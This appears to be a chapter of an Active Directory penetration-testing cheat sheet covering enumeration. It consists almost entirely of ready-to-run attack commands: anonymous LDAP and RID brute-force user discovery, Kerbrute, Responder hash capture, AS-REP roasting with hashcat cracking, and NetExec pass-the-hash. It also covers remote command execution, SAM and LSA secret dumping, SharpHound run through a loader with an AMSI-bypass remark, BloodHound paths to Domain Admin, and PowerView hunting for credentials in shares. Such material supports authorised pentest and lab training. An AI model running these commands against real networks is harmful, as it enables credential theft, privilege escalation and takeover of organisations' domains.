# 02 — Enumeration: LDAP, BloodHound, PowerView, CME

[← Back to index](README.md)

## 2.1 Unauthenticated / Initial Enumeration

### LDAP Anonymous Enumeration

```bash
# Check if anonymous LDAP bind is allowed
ldapsearch -x -H ldap://$DC_IP -s base namingcontexts
ldapsearch -x -H ldap://$DC_IP -s sub -b 'DC=corp,DC=local' | grep corp | grep Legacy
ldapsearch -x -H ldap://$DC_IP -b '' -s base '(objectClass=*)' '*' +

# Enumerate users anonymously
ldapsearch -x -H ldap://$DC_IP -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName

# Full anonymous enumeration
ldapsearch -x -H ldap://$DC_IP -b 'DC=corp,DC=local' \
    '(objectClass=*)' sAMAccountName userPrincipalName memberOf description
```

```bash
# enum4linux-ng — comprehensive unauthenticated enum
enum4linux-ng -A $DC_IP
enum4linux-ng -A -u '' -p '' $DC_IP

# RID cycling (enumerate users by RID without creds)
nxc smb $DC_IP --rid-brute
netexec smb $DC_IP --rid-brute 10000
netexec smb $DC_IP -u '.' -p '' --rid-brute

# Kerbrute — valid username enumeration via Kerberos
kerbrute userenum --dc $DC_IP --domain $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
kerbrute userenum --dc $DC_IP --domain $DOMAIN /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
kerbrute userenum --dc $DC_IP -d $DOMAIN users.txt -o valid_users.txt

# Netexec with validusers 
netexec smb $DC_IP -u usernames.txt -p usernames.txt --no-bruteforce 

nxc ldap $DC_IP -u $USER -p $PASS --users-export usernames.txt

# Rpcclient
rpcclient -U "" -N $DC_IP
rpcclient -U "" -N $DC_IP -c "enumdomusers"

rpcclient -U <username> $DC_IP 
> enumdomusers 
> enumdomains
> enumdomgroups
```

### Initial SMB/NetBIOS Enumeration

```bash
# SMB null session
smbclient -L //$DC_IP -N
smbclient -L //$DC_IP -U ''%''

smbclient -U 'DOMAIN/$USER%$PASS' //$DC_IP/SHARED-NAME 

smbclient --realm=corp.local 

# SMB All Folders Download 
> RECURSE on
> Prompt 
> mget *

# Use -t 3600, if file size is large to download.

# Enumerate shares
# Use -k with krb5.conf
nxc smb $DC_IP -u '' -p '' --shares
nxc smb $DC_IP -u '' -p '' --shares

# Spider_Plus to download SMB folders 
nxc smb $DC_IP -u $USER -p $PASS -M spider_plus -o EXCLUDE_FILTER='print$,ipc$,SYSVOL,NETLOGON'

# Nmap AD scripts
nmap -sV -p 88,389,445,464,636,3268,3269 --script 'ldap*,smb*,krb5*' $DC_IP
nmap --script ms-sql-info,ms-sql-config,ms-sql-empty-password -p 1433 10.10.10.0/24

# NBT-NS / LLMNR / mDNS Poisoning (Responder)
sudo responder -I eth0 -wfv
# Captures NTLMv2 hashes when machines try to resolve names
# Common triggers: accessing \\nonexistentshare, printers, etc.
```

### AS-REP Roasting

```bash
# Find accounts with pre-auth disabled (no creds needed)
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip DC_IP

# With valid credentials
impacket-GetNPUsers domain.local/user:pass -dc-ip DC_IP -request
```

```powershell
# From Windows (Rubeus)
.\Rubeus.exe asreproast /outfile:asrep.hash
```

```bash
# Crack
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

## 2.2 Authenticated LDAP Enumeration

```bash
# Authenticated LDAP query — all users
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'DC=corp,DC=local' '(objectClass=user)' \
    sAMAccountName userPrincipalName memberOf description pwdLastSet badPwdCount

# Find all domain admins
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'DC=corp,DC=local' \
    '(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local))' \
    sAMAccountName

# Find accounts with SPNs (Kerberoastable)
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'DC=corp,DC=local' \
    '(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
    sAMAccountName servicePrincipalName

# Find accounts with DONT_REQUIRE_PREAUTH (AS-REP roastable)
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'DC=corp,DC=local' \
    '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' \
    sAMAccountName

# Find unconstrained delegation accounts
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'DC=corp,DC=local' \
    '(userAccountControl:1.2.840.113556.1.4.803:=524288)' \
    sAMAccountName userAccountControl

# Find constrained delegation accounts
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'DC=corp,DC=local' \
    '(msDS-AllowedToDelegateTo=*)' \
    sAMAccountName msDS-AllowedToDelegateTo

# Find RBCD (Resource-Based Constrained Delegation) targets
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'DC=corp,DC=local' \
    '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' \
    sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity

# Find AdminCount=1 accounts (protected by AdminSDHolder)
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'DC=corp,DC=local' '(adminCount=1)' sAMAccountName memberOf

# Find all domain trusts
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'CN=System,DC=corp,DC=local' '(objectClass=trustedDomain)' \
    trustPartner trustDirection trustType trustAttributes
```

## 2.3 CrackMapExec / NetExec

```bash
# Basic authentication check
nxc smb $DC_IP -u $USER -p $PASS
nxc smb $DC_IP -u $USER -H $HASH      # PtH

# Enumerate shares
nxc smb $DC_IP -u $USER -p $PASS --shares
nxc smb $DC_IP -u $USER -p $PASS --shares -k 

# Enumerate users, groups, computers
nxc smb $DC_IP -u $USER -p $PASS --users
nxc smb $DC_IP -u $USER -p $PASS --groups
nxc smb $DC_IP -u $USER -p $PASS --computers

# Enumerate logged-on users (requires local admin)
nxc smb 10.10.10.0/24 -u $USER -p $PASS --loggedon-users

# Enumerate local admins
nxc smb 10.10.10.0/24 -u $USER -p $PASS --local-groups Administrators

# Password policy
nxc smb $DC_IP -u $USER -p $PASS --pass-pol

# Run commands
nxc smb 10.10.10.0/24 -u $USER -p $PASS -x 'whoami /all'
nxc smb 10.10.10.0/24 -u $USER -p $PASS -X 'Get-Process'   # PowerShell

# Dump SAM (local admin required)
nxc smb TARGET_IP -u $USER -p $PASS --sam

# Dump LSA secrets
nxc smb TARGET_IP -u $USER -p $PASS --lsa

# WinRM check
nxc winrm 10.10.10.0/24 -u $USER -p $PASS

# MSSQL enum
nxc mssql $DC_IP -u $USER -p $PASS --sql-query 'SELECT @@version'

# Spider shares for juicy files
nxc smb $DC_IP -u $USER -p $PASS -M spider_plus -o OUTPUT_FOLDER=/tmp/spider

# Grep for credentials in shares
nxc smb $DC_IP -u $USER -p $PASS -M spider_plus \
    -o INCLUDE_EXTENSIONS=txt,conf,config,ini,xml,ps1,bat,sh
```

## 2.4 BloodHound / SharpHound / RustHound-CE Collection

```powershell
# Run SharpHound collector (Windows)
# Use Loader 
C:\Tools\Loader.exe -Path C:\Tools\SharpHound.exe -args --collectionmethods All
# Download: https://github.com/BloodHoundAD/SharpHound
.\SharpHound.exe -c All --zipfilename bh_output
.\SharpHound.exe -c All,GPOLocalGroup --zipfilename bh_output
.\SharpHound.exe -c All -d corp.local --ldapusername $USER --ldappassword $PASS
```

```bash
# BloodHound Python collector (from Kali — no Windows needed)
pip3 install bloodhound --break-system-packages
bloodhound-python -d $DOMAIN -u $USER -p $PASS -c All -ns $DC_IP
bloodhound-python -d $DOMAIN -u $USER -p $PASS -c All,LoggedOn -ns $DC_IP --zip

# Via Kerberos ticket
bloodhound-python -d $PASS -u $USER -k --no-pass -c All -ns $DC_IP

# Via ldap
nxc ldap DC01.example.com -u '$USER' -p '$PASS' --bloodhound --collection All --dns-server $DC_IP

# Rusthound-CE 
rusthound-ce -d $DOMAIN -u '$USER' -p '$PASS' --zip

# BloodyAD - If nxc and bloodhound-python is not working
bloodyad -H $DC_IP -d $DOMAIN -u '$USER' -p '$PASS' get bloodhound 
bloodyad -H $DC_IP -d $DOMAIN -u '$USER' -p ':$HASH' get bloodhound 

# Import to BloodHound
# Start neo4j: sudo neo4j start
# Open BloodHound, click Upload Data, select .zip

# LOTL Method
C:\Tools\Loader.exe -Path C:\Tools\SharpHound.exe -args --collectionmethods Group,GPOlocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets,CertServices --excludedcs

# Build a cache
SOAPHound.exe --buildcache -c C:\Tools\cache.txt 
# Collect Bloodhound compatible data
SOAPHound.exe -c C:\Tools\cache.txt --bhdump -o C:\Tools\bloodhound-output --nolaps
```

### Key BloodHound Cypher Queries

```cypher
// Find all Domain Admins
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})
RETURN u

// Shortest path to DA from owned user
MATCH (u:User {owned:true}),(da:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}),
p=shortestPath((u)-[*1..]->(da)) RETURN p

// Find Kerberoastable users with path to DA
MATCH (u:User {hasspn:true}),(da:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}),
p=shortestPath((u)-[*1..]->(da)) RETURN p

// Find computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

// Find all owned principals with DA path
MATCH (n {owned:true}), (target:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}),
p=shortestPath((n)-[*1..10]->(target)) RETURN p

// Find User or Computer and Check the Object Info (especially password date)
MATCH p=(source)-[r]->(target) WHERE (source:Computer or source:User)
AND type(r) <> 'MemberOf'
RETURN p
```

## 2.5 PowerView Enumeration

```powershell
# Load PowerView (bypass AMSI first if needed)
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
. .\PowerView.ps1

# Domain Enumeration 
Get-DomainUser
Get-DomainUser -Identity name 
Get-DomainUser | select SamAccountName, LogonCount 

Get-ADUser -Filter * -Properties *
Get-ADUser -Identity name -Properties * 

Get-DomainComputer | Select Name
Get-DomainComputer -OperatingSystem "*Server 2019*"
Get-DomainComputer -Ping 

# Domain info
Get-NetDomain
Get-NetDomainController
Get-NetForest
Get-NetForestDomain

# User enumeration
Get-NetUser | Select-Object sAMAccountName, description, memberof, pwdlastset, lastlogon
Get-NetUser -SPN | Select-Object sAMAccountName, servicePrincipalName   # Kerberoastable
Get-NetUser -PreauthNotRequired | Select-Object sAMAccountName          # ASREPRoastable
Get-NetUser -AdminCount | Select-Object sAMAccountName                  # AdminCount=1

# Group enumeration
Get-NetGroup | Select-Object GroupName
Get-NetGroupMember 'Domain Admins' -Recurse
Get-NetGroupMember 'Enterprise Admins' -Recurse
Get-NetGroupMember 'Backup Operators' -Recurse

# Computer enumeration
Get-NetComputer | Select-Object dnshostname, operatingsystem
Get-NetComputer -Unconstrained | Select-Object dnshostname             # Unconstrained delegation
Get-NetComputer -TrustedToAuth | Select-Object dnshostname,msdsallowedtodelegateto

# GPO enumeration
Get-NetGPO | Select-Object displayName, gpcFileSysPath
Get-NetGPOGroup

# OU enumeration
Get-NetOU | Select-Object DistinguishedName
Get-NetOU -OUName 'Admin Users'

# Find active sessions
Get-NetSession -ComputerName DC01
Get-NetLoggedon -ComputerName DC01

# Find where local admin access
Find-LocalAdminAccess -Verbose                  # Slow but comprehensive
Find-LocalAdminAccess -ComputerFile computers.txt

# Shares
Invoke-ShareFinder -Verbose
Invoke-FileFinder -ShareList shares.txt -Keywords password,secret,cred

# Domain trusts
Get-NetDomainTrust
Get-NetForestTrust
Get-NetDomainTrust -Domain external.local

# ACL enumeration (for specific user)
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -Match '$USER'}

# ACL for specific object
Get-ObjectAcl -SamAccountName 'Domain Admins' -ResolveGUIDs
Get-ObjectAcl -ADSpath 'CN=Domain Admins,CN=Users,DC=corp,DC=local' -ResolveGUIDs
```

## 2.6 ADModule Enumeration 

```powershell
# Load ADModule
Import-Module C:\AD\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\ActiveDirectory\ActiveDirectory.pds1

# Domain Policy
Get-DomainPolicyData 
(Get-DomainPolicyData).systemaccess

(Get-DomainPolicyData -domain moneycorp.local).systemaccess

# Domain Enumeration
Get-DomainUser
Get-DomainUser -Identity name 
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity name -Properties * 

# if the account has high login value, some scripts or automation running. 
Get-DomainUser -Identity <name> -Properties * 
Get-DomainUser -Properties samaccountname,logonCount

# Strings in user's attribute
Get-DomainUser -LDAPFilter "Description=*built* | Select name,Description 
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description

# Domain Computer 
Get-DomainComputer | Select samaccountname
Get-DomainComputer | Select samaccountname, logoncount 

# Get all the groups in the current domain
Get-DomainGroup | Select Name
Get-DomainGroup -Domain <targetDomain>
Get-ADGroup -Filter * | Select Name
Get-ADGroup -Filter * -Properties * 

Get-DomainGroup *admin* 
Get-DomainGroup *admin* | Select cn

# Check Enterprise Admin
Get-DomainGroup *admin* -Domain <$Domain> | Select cn
Get-ADGroup -Filter 'Name -like "*admin*" | Select  Name'

# Domain Group Members 
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-ADGroupMember -Identity "Domain Admins" -Recursive 

# Membership for a User
Get-DomainGroup -UserName "<name>"
Get-ADPrincipalGroupMembership -Identity <name>

# List all the local groups on a machine 
Get-NetLocalGroup -ComputerName <name>
Get-NetLocalGroup -ComputerName <name> -GroupName Administrators 

# Logged Users (local admin priv required)
Get-NetLoggedon -ComputerName <name>
Get-LoggedonLocal -ComputerName <name>
Get-LastLoggedOn -ComputerName <name>

# Find shares, files, fileserver on hosts
# Recommended PowerHuntShares
# https://github.com/NetSPI/PowerHuntShares
Invoke-ShareFinder -Verbose 
Invoke-FileFinder -Verbose
Get-NetFileServer

Invoke-HuntSMBShares -NoPint -OutputDirectory C:\Tools -HostList C:\Tools\servers.txt

```

---

[← Prev: 01 — Methodology & Lab Setup](01-methodology-and-lab-setup.md) | [Next: 03 — Kerberos Attacks →](03-kerberos-attacks.md)
